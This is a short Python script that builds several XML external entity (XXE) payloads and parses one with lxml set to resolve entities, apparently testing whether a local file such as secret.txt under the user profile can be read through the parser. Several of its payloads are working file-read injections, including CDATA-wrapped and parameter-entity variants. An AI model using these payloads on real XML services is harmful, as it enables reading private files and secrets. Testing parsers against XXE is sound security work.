from lxml import etree

payload=r"""
<foo>
    <![CDATA[<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///%USERPROFILE%/secret.txt"> ]> <foo>&ent;</foo>]]>
</foo>
"""
payload2 = r"""
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
"""

payload3 = r"""<?xml version="1.0" ?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///%USERPROFILE%/secret.txt"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&ent;</lastName>
 </userInfo>
"""

payload4 = r"""
 <CityStateLookupRequest>
  <ZipCode>
    <Zip5>
        <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "file:///%USERPROFILE%/secret.txt"> %dtd;]><xxx/>]]>
    </Zip5>
  </ZipCode>
 </CityStateLookupRequest>
"""

parser = etree.XMLParser(resolve_entities=True)
root = etree.fromstring(payload3, parser)
# print(f"{root['CityStateLookupRequest']}")
root_as_string = etree.tostring(root)

print(f"{root_as_string}")